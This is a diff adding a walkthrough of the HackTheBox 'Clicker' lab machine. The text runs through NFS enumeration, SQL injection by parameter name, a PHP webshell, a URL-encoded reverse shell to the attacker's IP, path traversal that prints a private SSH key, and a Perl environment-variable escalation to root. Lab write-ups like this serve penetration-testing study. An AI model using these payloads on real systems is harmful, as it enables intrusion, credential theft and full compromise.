@@ -1,0 +1,402 @@
+### Services Enumeration
+The first step is to enumerate the services and gather information about them. To do this, we execute the following command:
+
+```
+$ sudo nmap -sC -sV -p22,80,111,2049 clicker.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-04 16:08 CET
+Nmap scan report for clicker.htb (10.10.11.232)
+Host is up (0.16s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
+|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Clicker - The Game
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      34623/tcp   mountd
+|   100005  1,2,3      39378/udp6  mountd
+|   100005  1,2,3      53913/tcp6  mountd
+|   100005  1,2,3      54881/udp   mountd
+|   100021  1,3,4      35867/udp   nlockmgr
+|   100021  1,3,4      42529/tcp   nlockmgr
+|   100021  1,3,4      45035/udp6  nlockmgr
+|   100021  1,3,4      46257/tcp6  nlockmgr
+|   100024  1          39343/tcp   status
+|   100024  1          44187/udp   status
+|   100024  1          50753/udp6  status
+|   100024  1          51783/tcp6  status
+|   100227  3           2049/tcp   nfs_acl
+|_  100227  3           2049/tcp6  nfs_acl
+2049/tcp open  nfs_acl 3 (RPC #100227)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
+``` 
+
+The host has open ports for SSH, HTTP, RPC, and NFS. Ideally, we should go through each one, analyze, and search for vulnerabilities in each.
+
+### RCP y NFS analysis
+
+In [HackTricks RPCbind Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind), they mention that RPC and NFS are used together. It can be seen in the nmap output that versions 3 and 4 are supported by NFS. We will proceed to analyze NFS, and there's also a reference guide at [HackTricks NFS Pentesting](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting).
+
+The following command displays the shared folders of the victim.
+
+```bash
+$ showmount -e clicker.htb      
+Export list for clicker.htb:
+/mnt/backups *
+```
+
+The folder `/mnt/backups` is being shared. The asterisk `*` at the end of the line indicates that any authorized host can mount this exported directory. So, let's mount the remote folder `/mnt/backups` into the local folder `/mnt/backups_local`.
+
+```bash
+$ mkdir /mnt/backups_local
+$ sudo mount -t nfs -o vers=3 clicker.htb:/mnt/backups /mnt/backups_local
+$ ls -la /mnt/backups_local
+total 2240
+drwxr-xr-x 2 nobody nogroup    4096 Sep  5 21:19 .
+drwxr-xr-x 3 root   root       4096 Nov 24 17:29 ..
+-rw-r--r-- 1 root   root    2284115 Sep  1 22:27 clicker.htb_backup.zip
+```
+
+We come across a .zip file. Upon extracting it in the same folder, we encounter a lack of write permissions. Simply move this .zip to another folder outside the mounted directory and decompress it. What we find is a backup of the web server files.
+
+```bash
+$ unzip clicker.htb_backup.zip
+
+$ tree clicker.htb
+clicker.htb
+├── admin.php
+├── assets
+│   ├── background.png
+│   ├── cover.css
+│   ├── css
+│   │   ├── bootstrap-grid.css
+│   │   ├── bootstrap-grid.css.map
+│   │   ├── bootstrap-grid.min.css
+│   │   ├── bootstrap-grid.min.css.map
+│   │   ├── bootstrap-reboot.css
+│   │   ├── bootstrap-reboot.css.map
+│   │   ├── bootstrap-reboot.min.css
+│   │   ├── bootstrap-reboot.min.css.map
+│   │   ├── bootstrap.css
+│   │   ├── bootstrap.css.map
+│   │   ├── bootstrap.min.css
+│   │   └── bootstrap.min.css.map
+│   ├── cursor.png
+│   └── js
+│       ├── bootstrap.bundle.js
+│       ├── bootstrap.bundle.js.map
+│       ├── bootstrap.bundle.min.js
+│       ├── bootstrap.bundle.min.js.map
+│       ├── bootstrap.js
+│       ├── bootstrap.js.map
+│       ├── bootstrap.min.js
+│       └── bootstrap.min.js.map
+├── authenticate.php
+├── create_player.php
+├── db_utils.php
+├── diagnostic.php
+├── export.php
+├── exports
+├── index.php
+├── info.php
+├── login.php
+├── logout.php
+├── play.php
+├── profile.php
+├── register.php
+└── save_game.php
+```
+
+### Web analysis
+The website features a registration, a login, and a mini-game of clicking to level up.
+
+Let's register and log in with the following credentials:
+- Username: aldayr
+- Password: aldayr
+
+While analyzing the .php files, we come across some interesting ones...
+
+- The `admin.php` file displays top players and implies that privilege escalation within the app is possible.
+- The `diagnostic.php` file will show us important information if we provide a token (which we don't know).
+- The `export.php` file indicates that top players can be exported in txt, json, or html if we are an admin.
+- The `save_game.php` file saves the game by passing the number of clicks and levels as parameters.
+
+At this point, we should rule out the `admin.php` and `export.php` files since we are not admins. We might be tempted to brute force the token for access to `diagnostic.php`.
+
+diagnostic.php
+```php
+<?php
+if (isset($_GET["token"])) {
+    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
+        header("HTTP/1.1 401 Unauthorized");
+        exit;
+        }
+}
+else {
+    header("HTTP/1.1 401 Unauthorized");
+    die;
+}
+```
+
+However, brute-forcing the token might be time-consuming. To keep things concise, the crucial files now are `save_game.php` and `db_utils.php`, of which the important content is:
+
+save_game.php
+```php
+<?php
+session_start();
+include_once("db_utils.php");
+
+if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
+        $args = [];
+        foreach($_GET as $key=>$value) {
+                if (strtolower($key) === 'role') {
+                        // prevent malicious users to modify role
+                        header('Location: /index.php?err=Malicious activity detected!');
+                        die;
+                }
+                $args[$key] = $value;
+        }
+        save_profile($_SESSION['PLAYER'], $_GET);
+        // update session info
+        $_SESSION['CLICKS'] = $_GET['clicks'];
+        $_SESSION['LEVEL'] = $_GET['level'];
+        // header('Location: /index.php?msg=Game has been saved!');
+
+}
+?>
+```
+
+db_utils.php
+```php 
+function save_profile($player, $args) {
+        global $pdo;
+        $params = ["player"=>$player];
+        $setStr = "";
+        foreach ($args as $key => $value) {
+                $setStr .= $key . "=" . $pdo->quote($value) . ",";
+        }
+        $setStr = rtrim($setStr, ",");
+        print($setStr);
+        $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
+        $stmt -> execute($params);
+}
+```
+
+### SQL Injection
+
+The file `save_game.php` is used to save the game score, and the request should look like this: `/save_game.php?clicks=10&level=1`. However, it filters the parameter name `role`. The reason is simple; it tries to prevent changing the user's role through SQL Injection. Since it doesn't accept the name "role," we can try passing it as the parameter value like this: `/save_game.php?clicks=10&level=1,role='Admin`. However, this won't work because the `$pdo->quote()` function filters out the quotes. After many attempts to inject SQL into the parameter value, I decided to try a SQLi with the parameter name, and it worked! This is the payload to change the role to administrator.
+
+```txt
+GET /save_game.php?clicks=18&%6c%65%76%65%6c%3d%31%2c%72%6f%6c%65=Admin HTTP/1.1
+Host: clicker.htb
+...
+```
+
+> Note: URL decoded `/save_game.php?clicks=18&level=1,role=Admin`
+
+This will enable a new admin page that allows us to export txt, json, and html files with the top players having a score above 1000000, which will then be served by the same web application. So, what we'll do is modify the file extension to export to PHP and also change the `threshold` to 0, so it shows our user as well. Alternatively, you can modify your score to surpass the `threshold`. After this, we'll change our nickname to a PHP webshell. The payload to change the nickname to a webshell is:
+
+```txt
+GET /save_game.php?clicks=0&level=1&nickname=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%30%5d%29%3b%20%3f%3e HTTP/1.1
+Host: clicker.htb
+...
+```
+
+> Note: URL decoded  `/save_game.php?clicks=0&level=1&nickname=<?php system($_GET[0]); ?> `
+
+Now, export the PHP file,
+```php
+POST /export.php HTTP/1.1
+Host: clicker.htb
+...
+threshold=0&extension=php
+```
+
+and the response will display the endpoint where the generated PHP is located.
+
+```
+/exports/top_players_xbsukcw8.php
+```
+
+### Obtain reverse shell 
+
+To send commands to the webshell, use requests like `/exports/top_players_xbsukcw8.php?0=id`. Use netcat to listen on port 9000.
+
+```bash
+nc -lvnp 9000
+```
+
+and through the webshell, we'll obtain a reverse shell. You can generate a reverse shell payload using [Revshell Tool](https://www.revshells.com/).
+
+```
+/exports/top_players_xbsukcw8.php?0=%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%31%37%38%2f%39%30%30%30%20%30%3e%26%31%22
+```
+## Lateral Movement
+To view SUID binaries, use:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Here, you'll find the file `/opt/manage/execute_query`, which at the same level has a `README.txt`.
+```
+Web application Management
+
+Use the binary to execute the following task:
+                - 1: Creates the database structure and adds user admin
+                - 2: Creates fake players (better not tell anyone)
+                - 3: Resets the admin password
+                - 4: Deletes all users except the admin
+```
+Let's use the `strings` command.
+
+```
+www-data@clicker:/opt/manage/$ strings execute_query
+...
+/home/jaH
+ck/queriH
+/usr/binH
+/mysql -H
+u clickeH
+r_db_useH
+r --passH
+word='clH
+icker_dbH
+_passworH
+d' clickH
+er -v < H
+ERROR: not enough arguments
+ERROR: Invalid arguments
+create.sql
+populate.sql
+reset_password.sql
+clean.sql
+File not readable or not found
+:*3$"
+GCC: (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0
+...
+```
+
+It seems that the executable connects to the database and executes some .sql files located in the `/home/jack/queri*` folder. There are also error messages if there are invalid or insufficient arguments.
+
+Now, let's use the `strace` command to delve into what the binary is doing. There's a lot of text here, but the important part is as follows.
+
+```
+www-data@clicker:/opt/manage/$ strace ./execute_query 4
+...
+setreuid(1000, 1000) = -1 EPERM (Operation not permitted)
+access("/home/jack/queries/clean.sql", R_OK) = -1 EACCES (Permission denied)
+newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...},
+AT_EMPTY_PATH) = 0
+write(1, "File not readable or not found\n", 31File not readable or not found) =
+31
+...
+```
+
+It attempts to change the User ID, but `strace` can't capture it. Additionally, the binary tries to execute the file `/home/jack/queries/clean.sql`, but it lacks permissions. Now, let's perform a path traversal attack using a non-existent option as the first argument and the relative path `../.ssh/id_rsa` as the second parameter.
+
+```txt
+www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 5 ../.ssh/id_rsa
+mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------
+-----BEGIN OPENSSH PRIVATE KEY---
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
+J/tSzgoR9Fko8I1UpLnHCLz2Ezsb/MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1
+kAAZ9Uot6ep/ekM8E+7/39VZ5fe1FwZj4iRKI+g/BVQFclsgK02B594GkOz33P/Zzte2jV
+Tgmy3+htPE5My31i2lXh6XWfepiBOjG+mQDg2OySAphbO1SbMisowP1aSexKMh7Ir6IlPu
+nuw3l/luyvRGDN8fyumTeIXVAdPfOqMqTOVECo7hAoY+uYWKfiHxOX4fo+/fNwdcfctBUm
+pr5Nxx0GCH1wLnHsbx+/oBkPzxuzd+BcGNZp7FP8cn+dEFz2ty8Ls0Mr+XW5ofivEwr3+e
+...
+F0YCoftLetCA/kiVtqlT0trgO8Yh+78QAAAMEAwYV0GjQs3AYNLMGccWlVFoLLPKGItynr
+Xxa/j3qOBZ+HiMsXtZdpdrV26N43CmiHRue4SWG1m/Vh3zezxNymsQrp6sv96vsFjM7gAI
+JJK+Ds3zu2NNNmQ82gPwc/wNM3TatS/Oe4loqHg3nDn5CEbPtgc8wkxheKARAz0SbztcJC
+LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi
+lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==
+-----END OPENSSH PRIVATE KEY---
+--------------
+``````
+
+We use the private key to log in via SSH as jack.
+
+```bash
+ssh -i id_rsa jack@clicker.htb 
+```
+
+### Privilege Escalation
+
+Now, let's check if we have certain privileges in sudoers.
+
+
+```txt
+jack@clicker:~$ sudo -l
+Matching Defaults entries for jack on clicker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jack may run the following commands on clicker:
+    (ALL : ALL) ALL
+    (root) SETENV: NOPASSWD: /opt/monitor.sh
+```
+
+Indeed, we can execute `/opt/monitor.sh` as root, and we also have permission to modify environment variable values when running the script. Let's analyze the script.
+
+```bash
+jack@clicker:~$ cat /opt/monitor.sh
+#!/bin/bash
+if [ "$EUID" -ne 0 ]
+  then echo "Error, please run as root"
+  exit
+fi
+
+set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+unset PERL5LIB;
+unset PERLLIB;
+
+data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
+/usr/bin/xml_pp <<< $data;
+if [[ $NOSAVE == "true" ]]; then
+    exit;
+else
+    timestamp=$(/usr/bin/date +%s)
+    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
+fi
+```
+
+The line `/usr/bin/xml_pp` is written in Perl, so it's clear that this script will be executed with Perl. While researching, I found a [vulnerability](https://www.exploit-db.com/exploits/39702) for local privilege escalation in PERL. You can find more information about environment variables for PERL [here](https://perldoc.perl.org/perlrun).
+
+This vulnerability allows the execution of a root command by exploiting Perl's environment variables. The command looks like this:
+
+```
+sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
+```
+
+The `PERL5OPT=-d` set makes Perl commands have the `-d` (debugger) argument.
+
+The `PERL5DB='exec "chmod u+s /bin/bash"'` set causes that line to execute when the debugger starts.
+
+In other words, when running the .sh, the `chmod u+s /bin/bash` command will be executed.
+
+Now, simply run bash, and you'll have root access.
+
+```
+/bin/bash -p
+```
